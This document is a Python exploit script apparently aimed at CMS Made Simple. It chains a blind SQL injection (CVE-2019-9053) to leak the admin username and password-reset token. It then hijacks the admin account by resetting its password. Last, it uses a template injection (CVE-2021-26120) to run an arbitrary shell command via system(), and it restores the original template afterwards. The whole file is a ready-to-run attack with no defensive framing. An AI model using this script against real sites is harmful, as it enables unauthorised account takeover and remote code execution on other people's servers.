import requests
import sys
import re
from time import sleep
from lxml import etree

def login(s, t, usr):
    uri = "%sadmin/login.php" % t
    s.get(uri)
    d = {
        "username" : usr,
        "password" : usr,
        "loginsubmit" : "Submit"
    }
    r = s.post(uri, data=d)
    match = re.search("style.php\?__c=(.*)\"", r.text)
    assert match, "(-) login failed"
    return match.group(1)

def trigger_or_patch_ssti(s, csrf, t, tpl):
    # CVE-2021-26120 
    d = {
        "mact": 'DesignManager,m1_,admin_edit_template,0',
        "__c" : csrf,
        "m1_tpl" : 10,
        "m1_submit" : "Submit",
        "m1_name" : "Simplex",
        "m1_contents" : tpl
    }
    r = s.post("%sadmin/moduleinterface.php" % t, files={}, data=d)
    if "rce()" in tpl:
        r = s.get("%sindex.php" % t)
        assert ("endrce" in r.text), "(-) rce failed!"
        cmdr = r.text.split("endrce")[0]
        print(cmdr.strip())

def determine_bool(t, exp):
    p = {
       "mact" : "News,m1_,default,0",
       "m1_idlist": ",1)) and %s-- " % exp
    }
    r = requests.get("%smoduleinterface.php" % t, params=p) 
    return True if r.text.count("Posted by:") == 2 else False

def trigger_sqli(t, char, sql, c_range):
    # CVE-2019-9053
    for i in c_range:
        # <> characters are html escaped so we just have =
        # substr w/ from/for because anymore commas and the string is broken up resulting in an invalid query
        if determine_bool(t, ",1)) and ascii(substr((%s) from %d for 1))=%d-- " % (sql, char, i)): return chr(i) 
    return -1
    
def leak_string(t, sql, leak_name, max_length, c_range):
    sys.stdout.write("(+) %s: " % leak_name)
    sys.stdout.flush()
    leak_string = ""
    for i in range(1,max_length+1):
        c = trigger_sqli(t, i, sql, c_range)
        # username is probably < 25 characters
        if c == -1:
            break
        leak_string += c
        sys.stdout.write(c)
        sys.stdout.flush()
    assert len(leak_string) > 0, "(-) sql injection failed for %s!" % leak_name
    return leak_string    
    
def reset_pwd_stage1(t, usr):
    d = {
        "forgottenusername" : usr,
        "forgotpwform" : 1,
    }
    r = requests.post("%sadmin/login.php" % t, data=d)
    assert ("User Not Found" not in r.text), "(-) password reset failed!"

def reset_pwd_stage2(t, usr, key):
    d = {
        "username" : usr,
        "password" : usr,      # just reset to the username
        "passwordagain" : usr, # just reset to the username
        "changepwhash" : key,
        "forgotpwchangeform": 1,
        "loginsubmit" : "Submit",
    }
    r = requests.post("%sadmin/login.php" % t, data=d)
    match = re.search("Welcome: <a href=\"myaccount.php\?__c=[a-z0-9]*\">(.*)<\/a>", r.text)
    assert match, "(-) password reset failed!"
    assert match.group(1) == usr, "(-) password reset failed!"

def leak_simplex(s, t, csrf):
    p = {
        "mact" : "DesignManager,m1_,admin_edit_template,0",
        "__c" : csrf,
        "m1_tpl" : 10
    }
    r = s.get("%sadmin/moduleinterface.php" % t, params=p)
    page = etree.HTML(r.text)
    tpl = page.xpath("//textarea//text()")
    assert tpl is not None, "(-) leaking template failed!"
    return "".join(tpl)

def remove_locks(s, t, csrf):
    p = {
        "mact" : "DesignManager,m1_,admin_clearlocks,0",
        "__c" : csrf,
        "m1_type" : "template"
    }
    s.get("%sadmin/moduleinterface.php" % t, params=p)

def main():
    if(len(sys.argv) < 4):
        print("(+) usage: %s <host> <path> <cmd>" % sys.argv[0])
        print("(+) eg: %s 192.168.75.141 / id" % sys.argv[0])
        print("(+) eg: %s 192.168.75.141 /cmsms/ \"uname -a\"" % sys.argv[0])
        return
    pth = sys.argv[2]
    cmd = sys.argv[3]
    pth = pth + "/" if not pth.endswith("/") else pth
    pth = "/" + pth if not pth.startswith("/") else pth
    target = "http://%s%s" % (sys.argv[1], pth)
    print("(+) targeting %s" % target)
    if determine_bool(target, "1=1") and not determine_bool(target, "1=2"):
        print("(+) sql injection working!")
    print("(+) leaking the username...")
    username = leak_string(
        target,
        "select username from cms_users where user_id=1",
        "username",
        25, # username column is varchar(25) in the db
        list(range(48,58)) + list(range(65,91)) + list(range(97,123)) # charset: 0-9A-Za-z
    )
    print("\n(+) resetting the %s's password stage 1" % username)
    reset_pwd_stage1(target, username)
    print("(+) leaking the pwreset token...")
    pwreset = leak_string(
        target,
        "select value from cms_userprefs where preference=0x70777265736574 and user_id=1", # qoutes will break things
        "pwreset",
        32, # md5 hash is always 32
        list(range(48,58)) + list(range(97,103)) # charset: 0-9a-f
    )
    print("\n(+) done, resetting the %s's password stage 2" % username)
    reset_pwd_stage2(target, username, pwreset)
    session = requests.Session()
    print("(+) logging in...")
    csrf = login(session, target, username)
    print("(+) leaking simplex template...")
    remove_locks(session, target, csrf)
    simplex_tpl = leak_simplex(session, target, csrf)
    print("(+) injecting payload and executing cmd...\n")
    rce_tpl = "{function name='rce(){};system(\"%s\");function '}{/function}endrce" % cmd
    trigger_or_patch_ssti(session, csrf, target, rce_tpl+simplex_tpl)
    while True:
        r = session.get("%sindex.php" % target)
        if "endrce" not in r.text:
            break
        trigger_or_patch_ssti(session, csrf, target, simplex_tpl)

if __name__ == '__main__':
    main()
